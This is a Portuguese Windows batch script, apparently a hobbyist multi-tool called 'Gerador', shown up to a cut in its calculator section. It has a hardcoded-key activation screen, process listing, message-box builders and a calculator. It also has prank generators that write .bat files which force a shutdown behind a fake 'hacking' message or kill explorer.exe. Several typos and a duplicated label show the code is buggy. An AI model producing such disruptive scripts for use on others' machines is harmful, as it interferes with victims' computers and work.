:inicio
@echo off
title Gerador
call configGC.bat
copy NUL %userprofile%\arquivos_temporarios_do_gerador\arent.atgc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\al.us
:ini
color 0b
cls
echo.
echo.                                                                                
echo.                                                                                
echo.                                                                                
echo.                                                                                
echo         @@@@@@  @@@@@  @@@@@  @@@@@  @@@@   @@@@@  @@@@@                       
echo         @       @      @   @  @   @  @   @  @   @  @   @                       
echo         @  @@@  @@@@@  @@@@   @@@@@  @   @  @   @  @@@@                        
echo         @    @  @      @   @  @   @  @   @  @   @  @   @                       
echo         @@@@@@  @@@@@  @   @  @   @  @@@@   @@@@@  @   @                       
echo.                                                                               
echo                                                           William Pilger      
echo                                                     @@@@@@@@@@@@@@@@@@@@@@@@@ 
echo.                                                                               
echo.                                                                               
echo             1-Iniciar                                                         
echo             2-Sair                                                            
echo.                                                                               
echo.                                                                               
echo.                                                                               
echo.                                                                               
echo.                                                                               
echo.
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ ver goto ver
if %opcao% equ VER goto ver
if %opcao% equ 1 goto users
if %opcao% equ 2 goto sair
if %opcao% equ C goto AJUDA
goto ini
:sair
cls
echo Voce escolheu sair!!!
pause
exit
:verific
if not exist %userprofile%\arquivos_temporarios_do_gerador\arent.atgc goto falle
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep1\comtemp.txt goto reppend
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep2\comtemp.txt goto reppend
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep3\comtemp.txt goto reppend
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep4\comtemp.txt goto reppend
goto com
:falle
cls
echo algumas funcoes do gerador nao funcionarao neste cistema operacional!
pause
:com
cd desktop
if exist lixx.agc goto come1c
if exist liss.agc goto come1b
cd %userprofile%
if exist %userprofile%\arquivos_temporarios_do_gerador\lix.agc goto come1c
if exist %userprofile%\arquivos_temporarios_do_gerador\lis.agc goto come1b
:come1a
cd desktop
cls
color 0c
echo ###############################################################
echo #  @@@@   @    @                                              #
echo #  @  @    @  @         Falha na ativacao do produto          #
echo # @@@@@@    @@                                                #
echo # @@@@@@   @  @     ative o produto para comecar a usa-lo     #
echo # @@@@@@  @    @                                              #
echo.#                                                             #
echo ###############################################################
echo.
echo  1----sair
echo  2----inserir chave
echo.
set opcao=0
set /p opcao=***digite sua opcao---
 if %opcao% equ 1 goto sair
if %opcao% equ 2 goto ativ
goto come1a
:come1b
cd desktop
cls
color 0a
echo ###############################################################
echo #  @@@@                 Ativado parcialmente...               #
echo #  @  @         @   Alguns recursos nao estarao disponiveis   #
echo # @@@@@@   @   @                                              #
echo # @@@@@@    @ @      digite  ATIVAR para incerir a chave...   #
echo # @@@@@@     @                                                #
echo.#                                                             #
echo ###############################################################
goto come3
:come1c
cd desktop
cls
color 0b
echo     @@@@  @@@@  @@@@  @@@@  @@@@   @@@@  @@@@  Produto ativado
echo     @     @     @  @  @  @  @   @  @  @  @  @           @
echo     @ @@  @@@@  @@@   @@@@  @   @  @  @  @@@       @   @
echo     @  @  @     @  @  @  @  @   @  @  @  @  @       @ @
echo     @@@@  @@@@  @  @  @  @  @@@@   @@@@  @  @        @
echo                                                Produto ativado
echo.
echo.
:come3
echo #########################################################
echo #Seja bem vindo
echo #Usuario logado ================ %usernam%
echo #########################################################
echo # 1----Ver processos em andamento.......................#
echo # 2----Desligar o PC....................................#
echo # 3----Fechar programas.................................#
echo # 4----Enviar caixa de dialogo..........................#
echo # 5----Calculadora......................................#
echo # 6----Virus e sacanagens...............................#
echo # 7----Bloquear sites...................................#
echo # 8----Repetidor/Loop...................................#
echo # 9----Remover virus.(Escolar)..........................#
echo # 10---opcoes...........................................#
echo # 11---voltar...........................................#
echo #########################################################
echo.
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ ATIVAR goto ativ
if %opcao% equ ativar goto ativ 
if %opcao% equ 1 goto com1
if %opcao% equ 2 goto com2
if %opcao% equ 3 goto com3
if %opcao% equ 4 goto com4
if %opcao% equ 5 goto com5
if %opcao% equ 6 goto com6
if %opcao% equ 7 goto com7
if %opcao% equ 8 goto com8
if %opcao% equ 9 goto com9
if %opcao% equ 10 goto config
if %opcao% equ 11 goto ini
goto com
:ver
echo     total=HPXWP-PRO
echo   parcial=HPXWP
pause
goto ini
:ativ
cls
echo digite 1 para voltar
set /p sereal=***digite o codigo de ativacao---
if %sereal% equ HPXWP goto activa
if %sereal% equ hpxwp goto activa
if %sereal% equ HPXWP-PRO goto activb
if %sereal% equ hpxwp-pro goto activb
if %sereal% equ 1 goto com
echo Ops!!! sereal incorreto!!!
echo tente novamente...
pause
goto ativ
:activa
cd desktop
copy NUL liss.agc
echo comprovante de ativacao do Gerador > %userprofile%\arquivos_temporarios_do_gerador\lis.agc
echo sua licenca é parcial>> %userprofile%\arquivos_temporarios_do_gerador\lis.agc
echo Produto parcialmente desbloqueado!!! >> %userprofile%\arquivos_temporarios_do_gerador\lis.agc
attrib +h +s %userprofile%\arquivos_temporarios_do_gerador\lis.agc
attrib +h +s liss.agc
color 0a
cls
echo             @@@
echo            @   @
echo           @     @
echo           @     @
echo                 @                   #
echo          @@@@@@@@@                 #
echo          @@@   @@@            #   #
echo          @@@ @ @@@             # #
echo          @@@   @@@              #
echo          @@@@@@@@@
echo.         
echo      Oproduto foi ativado parcialmente com sucesso!!!
pause
goto com
:activb
cd desktop
copy NUL lixx.agc
echo comprovante de ativacao do Gerador > %userprofile%\arquivos_temporarios_do_gerador\lix.agc
echo sua licenca é total >> %userprofile%\arquivos_temporarios_do_gerador\lix.agc
echo Produto totalmente desbloqueado!!! >> %userprofile%\arquivos_temporarios_do_gerador\lix.agc
attrib +h +s %userprofile%\arquivos_temporarios_do_gerador\lix.agc
attrib +h +s lixx.agc
color 0b
cls
echo             @@@
echo            @   @
echo           @     @
echo           @     @
echo                 @                   #
echo          @@@@@@@@@                 #
echo          @@@   @@@            #   #
echo          @@@ @ @@@             # #
echo          @@@   @@@              #
echo          @@@@@@@@@
echo.         
echo      Oproduto foi ativado com sucesso!!!
pause
goto com
:com1
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA1.gc goto notpodiss
cls
echo.
echo.
echo.
echo   Ver processos em andamento
echo.
echo.
echo #########################################################
echo # 1----Executar o comando no cmd........................#
echo # 2----Criar a lista em um arquivo de texto.............#
echo # 3----Voltar...........................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com11
if %opcao% equ 2 goto com12
if %opcao% equ 3 goto com
goto com1
:com11
cls
tasklist
pause
goto com1
:com12
cls
set /p nome=***digite o nome como deseja salva-lo(sem extensao)---
cd desktop
tasklist >> %nome%.txt
cls
:com121
echo.
echo A lista foi gerada com sucesso!!
echo E foi salva no diretório DESTE gerador como %nome%.txt!
echo OBS: em alguns casos ele e salvo na area de trabalho...
echo.
echo.
echo.
set /p opcao=***Deseja abri-lo agora?(S/N)---
if %opcao% equ S goto com122
if %opcao% equ s goto com122
if %opcao% equ N goto com1
if %opcao% equ n goto com1
goto com12
:com122
cd desktop
start %nome%.txt
goto com1
:com2
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA2.gc goto notpodiss
cls
echo.
echo.
echo      desligar um PC e enviar uma mensagen ao usuario.
echo.
echo ########################################################
echo # 1----Desligar este computador........................#
echo # 2----Cancelar o desligamento do computador...........#
echo # 3----Criar .bat......................................#
echo # 4----Ver e tirar duvidas.............................#
echo # 5----Voltar..........................................#
echo ########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com21
if %opcao% equ 2 goto com22
if %opcao% equ 3 goto com23
if %opcao% equ 4 goto com24
if %opcao% equ 5 goto com
goto com2
:com21
cls
set /p tempo=***em quanto tempo o computador deve ser desligado?(em segundos)----
shutdown -s -f -t %tempo% -c "Seu computador sera desligado em %tempo% segundos!
cls
goto com2
:com22
cls
shutdown /a
pause
goto com2
:com23
cls
echo.
echo     digite o tempo que ele levara para desligar em segundos
set /p tempo=------
echo.
echo     digite sua mensagem
set /p men=------
echo.
echo     digite o nome como deseja que o .bat seja salvo
echo     OBS: não incira a sua extensao! Iremos cuidar disto para voce!
set /p nome=------
echo @echo off > %nome%.bat
echo echo hahahaha eu estou hackeando o seu computador >> %nome%.bat
echo shutdown -s -f -t %tempo% -c " %men% " >> %nome%.bat
cls
echo  O .bat foi salvo no diretorio DESTE gerador como %nome%.bat!!!
echo OBS: em alguns casos ele e salvo na area de trabalho...
pause
goto com2
:com24
cls
echo.
echo  O comando é   shutdown -s -f -t "tempo" -c "mensagen"
echo.
e2cho  Ex:  shutdown -s -f -t 60 -c "seu computador seara desligado"
echo.
echo.
echo. Serve para forcar o desligamento ou agendar o desligamento do computador.
echo  Também pode ser usado para fazer sacanagens com os amigos.
echo.
echo***************************************************************************
echo.
shutdown help
pause
goto com2
:com3
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA3.gc goto notpodiss
cls
echo   Comando para fechar programas do computador
echo.
echo #########################################################
echo # 1----Utilizar o comando...............................#
echo # 2----Salvar em um bat.................................#
echo # 3----ver e tirar duvidas..............................#
echo # 4----voltar...........................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com31
if %opcao% equ 2 goto com32a
if %opcao% equ 3 goto com33
if %opcao% equ 4 goto com
goto com3
:com31
cls
echo Abrindo lista de processos em execucao...
cd desktop
tasklist >> tarefas.txt
start tarefas.txt
pause
cls
set /p pro=***digite o nome do processo(com extensao)---
taskkill /f /im %pro%
cls
echo O processo foi encerrado com sucesso!!!
del tarefas.txt
pause
goto com3
:com32a
cls
echo O arquivo sera salvo no diretorio DESTE gerador...
echo OBS: em alguns casos ele e salvo na area de trabalho...
echo.
set /p nome=***escolha o nome do .bat(sem a extensao)---
:com32
cls
echo    escolha quais programas deseja que o .bat finalise quando ainiciado...
echo.
echo #########################################################
echo # 1---explorer..........................................#
echo # 2---Abrir lista de processos..........................#
echo # 3---digitar o nome do processo........................#
echo # 4---concluido.........................................#
echo #########################################################
echo.
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com321
if %opcao% equ 2 goto com322
if %opcao% equ 3 goto com323
if %opcao% equ 4 goto com324
if %opcao% equ 5 goto cancel
goto com32
:com321
cls
echo taskkill /f /im explorer.exe >> %nome%.bat
echo explorer foi adicionado com sucesso!!
pause
goto com32
:com322
cls
cd desktop
tasklist >> processos.txt
start processos.txt
pause
del processos.txt
goto com32
:com323
cls
set /p pro=***digite o nome do processo a ser adicionado(com extensao)---
echo taskkill /f /im %pro% >> %nome%.bat
cls
echo o processo foi adicionado com sucesso!!!
pause
goto com32
:com324
cls
echo >> %nome%.bat
echo o bat foi criado com sucesso!!!
pause
goto com3
:cancel
de desktop
del %nome%.bat
echo Cancelado!
pause
goto com3
:com33
cls
echo.
echo      o comando e    "taskkill /f /im NOMEDOPROCESSO"
echo      ele serve para fechar tarefas em andamento.
echo.
pause
goto com3
:com4
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA4.gc goto notpodiss
cls
echo   Enviar caixas de dialogo...
echo.
echo #########################################################
echo #  1---criar um .vbs....................................#
echo #  2---Criar um .vbs usando repetidor...................#
echo #  3---Voltar...........................................#
echo #########################################################
echo.
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com41
if %opcao% equ 2 goto com41x
if %opcao% equ 3 goto com
goto com4
:com41
cls
set /p nome=***digite o nome como deseja nomea-lo(sem extensao)---
cls
echo   após o termino, ele sera salvo no mesmo diretorio DESTE gerador!
echo   OBS: em alguns casos ele e salvo na area de trabalho...
:com41b
cls
echo             adicionar mensagens ao .vbs
echo.
echo.escolha o estilo da janela...
echo.
echo #########################################################
echo # 1---icone de situacao critica.........................#
echo # 2---icone de interogacao..............................#
echo # 3---botoes repetir e cancelar.........................#
echo # 4---botoes sim,nao e cancelar.........................#
echo # 5---botoes anular, repetis e ignorar..................#
echo # 6---botoes ok e cancelar..............................#
echo # 7---Icone de exclamacao...............................#
echo.# 8---voltar............................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com411
if %opcao% equ 2 goto com412
if %opcao% equ 3 goto com413
if %opcao% equ 4 goto com414
if %opcao% equ 5 goto com415
if %opcao% equ 6 goto com416
if %opcao% equ 7 goto com417
if %opcao% equ 8 goto com418
if %opcao% equ 9 goto com4
goto com41b
:com411
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
echo msgBox"%men%",vbCritical,"%tit%" >> %nome%.vbs
echo a mensagens foi adicionada com sucesso!!
pause
goto com41b
:com412
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
echo msgBox"%men%",vbQuestion,"%tit%" >> %nome%.vbs
echo a mensagens foi adicionada com sucesso!!
pause
goto com41b
:com413
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
echo msgBox"%men%",vbRetryCancel,"%tit%" >> %nome%.vbs
echo a mensagens foi adicionada com sucesso!!
pause
goto com41b
:com414
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
echo msgBox"%men%",vbYesNoCancel,"%tit%" >> %nome%.vbs
echo a mensagens foi adicionada com sucesso!!
pause
goto com41b
:com415
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
echo msgBox"%men%",vbAbortRetryIgnore,"%tit%" >> %nome%.vbs
echo a mensagens foi adicionada com sucesso!!
pause
goto com41b
:com416
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
echo msgBox"%men%",vbOkCancel,"%tit%" >> %nome%.vbs
echo a mensagens foi adicionada com sucesso!!
echo.
pause
goto com41b
:com417
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
echo msgBox"%men%",vbExclamation,"%tit%" >> %nome%.vbs
echo a mensagens foi adicionada com sucesso!!
pause
:com418
cls
set /p men=***digite a mensagen da janela---
echo msgBox"%men%" >> %nome%.vbs
echo a mensagens foi adicionada com sucesso!!
pause
goto com41b
:com41x
cls
set locavolt=com4
set /p nom=***nome como deseja salvar-lo(sem extensao)---
set nome=%nom%.vbs
goto com41b
:com41x
cls
echo.escolha o estilo da janela...
echo.
echo #########################################################
echo # 1---icone de situacao critica.........................#
echo # 2---icone de interogacao..............................#
echo # 3---botoes repetir e cancelar.........................#
echo # 4---botoes sim,nao e cancelar.........................#
echo # 5---botoes anular, repetis e ignorar..................#
echo # 6---botoes ok e cancelar..............................#
echo # 7---Icone de exclamacao...............................#
echo # 8---Somente botao ok..................................#
echo.# 9---voltar............................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com411x
if %opcao% equ 2 goto com412x
if %opcao% equ 3 goto com413x
if %opcao% equ 4 goto com414x
if %opcao% equ 5 goto com415x
if %opcao% equ 6 goto com416x
if %opcao% equ 7 goto com417x
if %opcao% equ 8 goto com418x
if %opcao% equ 9 goto com4
goto com8111
:com411x
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
set comand=msgBox"%men%",vbCritical,"%tit%"
goto com8repetidor
:com412x
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
set comand=msgBox"%men%",vbQuestion,"%tit%"
goto com8repetidor
:com413x
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
set comand=msgBox"%men%",vbRetryCancel,"%tit%"
goto com8repetidor
:com414x
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
set comand=msgBox"%men%",vbYesNoCancel,"%tit%"
goto com8repetidor
:com415x
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
set comand=msgBox"%men%",vbAbortRetryIgnore,"%tit%"
goto com8repetidor
:com416x
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
set comand=msgBox"%men%",vbOkCancel,"%tit%"
goto com8repetidor
:com417x
cls
set /p men=***digite a mensagen da janela---
set /p tit=***digite o titulo da janela---
set comand=msgBox"%men%",vbExclamation,"%tit%"
goto com8repetidor
:com418x
cls
set /p men=***digite a mensagen da janela---
set comand=msgBox"%men%"
goto com8repetidor
:com5
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA5.gc goto notpodiss
cls
color 3e
echo.
echo.
echo.
echo.
echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@       @@@       @@@       @@@       @@@ @@@@@ @@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@ @@@@@@@@@@@@ @@@@@@ @@@@@ @@@ @@@@@ @@@@ @@@ @@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@ @@@@@@@@@@@@ @@@@@@ @@@@@ @@@ @@@@@ @@@@@ @ @@@@@@@@
echo @@@@@@@       @@@@@ @@@@@       @@@@@@ @@@@@@ @@@@@ @@@      @@@@@@@ @@@@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@@@@@@@ @@@@@@ @@@@@@ @@@@@ @@@ @@@@@ @@@@@ @@@@@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@@@@@@@ @@@@@@ @@@@@@ @@@@@ @@@ @@@@@ @@@@ @@@@@@@@@@@
echo @@@@@@@ @@@@@ @@@@@ @@@@@       @@@@@@ @@@@@@       @@@ @@@@@ @@@ @@@@@@@@@@@@
echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo.
echo.
echo.
echo.
set /p ini=***Deseja ativar a funcao Historico?(S/N)--
if %ini% equ s goto plih
if %ini% equ S goto plih
if %ini% equ n goto pla
if %ini% equ N goto pla
echo opcao invalida!
pause
goto pli
:pla
cls
color 9e
echo.
echo.
echo.
echo.
echo.
echo.
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 1 @ soma         @
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 2 @ Subtracao    @
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 3 @ multiplicacao@
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 4 @ Divisao      @
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 5 @ voltar       @
echo      @@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=***digite a opcao--
if %opcao% equ 1 goto ex1
if %opcao% equ 2 goto ex2
if %opcao% equ 3 goto ex3
if %opcao% equ 4 goto ex4
if %opcao% equ 5 goto com
goto pla
:ex1
cls
color 3e
echo      @@@@@@@   @@@@@@@   @     @   @@@@@@@   
echo      @         @     @   @@   @@   @     @  
echo      @         @     @   @ @ @ @   @     @
echo      @@@@@@@   @     @   @  @  @   @@@@@@@
echo            @   @     @   @     @   @@@@@@@
echo            @   @     @   @     @   @     @
echo      @@@@@@@   @@@@@@@   @     @   @     @
echo.
echo.
echo.
echo.
echo.
set /p valor1so=**********Digite o primeiro valor**********
set /p valor2so=**********Digite o segundo valor***********
set /a resultadoso=%valor1so%+%valor2so%
echo.
echo      @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @@@@@@    @@@@@@@   @@@@@@@   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
echo ##############################################################
echo o resultado da soma e %resultadoso%
pause
:ex11
cls
echo           @@@@@@@@@@@@@@@@@@@@
echo           @ 1 @ nova soma    @
echo           @@@@@@@@@@@@@@@@@@@@
echo           @ 2 @ inicio       @
echo           @@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto ex1
if %opcao% equ 2 goto pla
goto ex11
:ex2
cls
color 2f
echo      @@@@@@@   @     @   @@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   
echo      @         @     @   @    @      @      @     @   @     @  
echo      @         @     @   @    @      @      @     @   @     @
echo      @@@@@@@   @     @   @@@@@       @      @@@@@@    @@@@@@@
echo            @   @     @   @    @      @      @     @   @     @
echo            @   @     @   @    @      @      @     @   @     @
echo      @@@@@@@   @@@@@@@   @@@@@@      @      @     @   @     @
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
set /p valor1su=**********Digite o primeiro valor**********
set /p valor2su=**********Digite o segundo valor***********
set /a resultadosu=%valor1su%-%valor2su%
echo.
echo      @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @@@@@@    @@@@@@@   @@@@@@@   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
echo ##############################################################
echo o resultado da subtracao e %resultadosu%
pause
:ex22
cls
echo           @@@@@@@@@@@@@@@@@@@@@@
echo           @ 1 @ nova subtraçao @
echo           @@@@@@@@@@@@@@@@@@@@@@
echo           @ 2 @ inicio         @
echo           @@@@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto ex2
if %opcao% equ 2 goto pla
goto ex22
:ex3
cls
color 1a
echo          @     @   @     @   @         @@@@@@@     @
echo          @@   @@   @     @   @            @        @
echo          @ @ @ @   @     @   @            @        @
echo          @  @  @   @     @   @            @        @
echo          @     @   @     @   @            @        @
echo          @     @   @     @   @            @        @
echo          @     @   @@@@@@@   @@@@@@@      @        @
echo.
echo.
echo       @@@@@@@   @        @   @@@@@@@   @@@@@@@   @@@@@@@
echo       @     @   @        @   @         @     @   @     @
echo       @     @   @        @   @         @     @   @     @
echo       @@@@@@@   @        @   @         @@@@@@@   @@@@@@@
echo       @         @        @   @         @     @   @    @
echo       @         @        @   @         @     @   @     @
echo       @         @@@@@@   @   @@@@@@@   @     @   @     @
echo.
echo.
echo.
set /p valor1mu=**********Digite o primeiro valor**********
set /p valor2mu=**********Digite o segundo valor***********
set /a resultadomu=%valor1mu%*%valor2mu%
echo.
echo      @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @@@@@@    @@@@@@@   @@@@@@@   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
echo #################################################################
echo o resultado da multiplicacao e %resultadomu%
pause
:ex33
cls
echo           @@@@@@@@@@@@@@@@@@@@@@@@@@
echo           @ 1 @ nova multiplicasao @
echo           @@@@@@@@@@@@@@@@@@@@@@@@@@
echo           @ 2 @ inicio             @
echo           @@@@@@@@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto ex3
if %opcao% equ 2 goto pla
goto ex33
:ex4
cls
color 8b
echo.
echo.
echo.                                                 @@  @
echo.                                                @  @@
echo.     
echo      @@@@@@@    @  @          @   @  @@@@@@@   @@@@@@@   @@@@@@@
echo      @      @   @   @        @    @  @         @     @   @     @
echo      @      @   @    @      @     @  @         @     @   @     @
echo      @      @   @     @    @      @  @@@@@@@   @@@@@@@   @     @
echo      @      @   @      @  @       @        @   @     @   @     @
echo      @      @   @       @@        @        @   @     @   @     @
echo      @@@@@@@    @                 @  @@@@@@@   @     @   @@@@@@@
echo.
echo.
echo.
echo.
echo.
set /p valor1di=**********Digite o primeiro valor**********
set /p valor2di=**********Digite o segundo valor***********
set /a resultadodi=%valor1di% / %valor2di%
echo.
echo      @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @@@@@@    @@@@@@@   @@@@@@@   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
echo ##############################################################
echo o resultado da divisao e %resultadodi%
pause
:ex44
cls
echo           @@@@@@@@@@@@@@@@@@@@
echo           @ 1 @ nova divisao @
echo           @@@@@@@@@@@@@@@@@@@@
echo           @ 2 @ inicio       @
echo           @@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto ex4
if %opcao% equ 2 goto pla
goto ex44
:plih
cd %temp%
echo Histórico da calculadora dia %date%, hora %time% >> %temp%\historico.txt
:plah
cls
color 9e
echo.
echo.
echo.
echo.
echo.
echo.
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 1 @ soma         @
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 2 @ Subtracao    @
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 3 @ multiplicacao@
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 4 @ Divisao      @
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 5 @ Historico    @
echo      @@@@@@@@@@@@@@@@@@@@
echo      @ 6 @ voltar       @
echo      @@@@@@@@@@@@@@@@@@@@
echo.
echo.
set opcao=0
set /p opcao=***digite a opcao--
if %opcao% equ 1 goto ex1h
if %opcao% equ 2 goto ex2h
if %opcao% equ 3 goto ex3h
if %opcao% equ 4 goto ex4h
if %opcao% equ 5 goto hih
if %opcao% equ 6 goto com
goto plah
:ex1h
cls
color 3e
echo      @@@@@@@   @@@@@@@   @     @   @@@@@@@   
echo      @         @     @   @@   @@   @     @  
echo      @         @     @   @ @ @ @   @     @
echo      @@@@@@@   @     @   @  @  @   @@@@@@@
echo            @   @     @   @     @   @@@@@@@
echo            @   @     @   @     @   @     @
echo      @@@@@@@   @@@@@@@   @     @   @     @
echo.
echo.
echo.
echo.
echo.
set /p valor1so=**********Digite o primeiro valor**********
set /p valor2so=**********Digite o segundo valor***********
set /a resultadoso=%valor1so%+%valor2so%
echo.
echo      @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @     @   @         @         @     @   @         @     @
echo      @@@@@@    @@@@@@@   @@@@@@@   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @               @   @     @   @         @     @
echo      @     @   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   @@@@@@@
echo. 
echo.                               @@  @
echo.                              @  @@
echo.
echo                    @@@@@@@   @@@@@@@   @@@@@@@
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @         @@@@@@@   @     @
echo                    @         @     @   @     @
echo                    @         @     @   @     @
echo                    @@@@@@@   @     @   @@@@@@@
echo                      @
echo                     @  @
echo                     @@@
echo ##############################################################
echo o resultado da soma e %resultadoso%
pause
cd %temp%
echo O resultado da soma de %valor1so% com %valor2so% e %resultadoso% >> %temp%\historico.txt
:ex11h
cls
echo           @@@@@@@@@@@@@@@@@@@@
echo           @ 1 @ nova soma    @
echo           @@@@@@@@@@@@@@@@@@@@
echo           @ 2 @ inicio       @
echo           @@@@@@@@@@@@@@@@@@@@
set opcao=0
set /p opcao=****Digite a opcao--
if %opcao% equ 1 goto ex1h
if %opcao% equ 2 goto plah
goto ex11h
:ex2h
cls
color 2f
echo      @@@@@@@   @     @   @@@@@@   @@@@@@@   @@@@@@@   @@@@@@@   
echo      @         @     @   @    @      @      @     @   @     @  
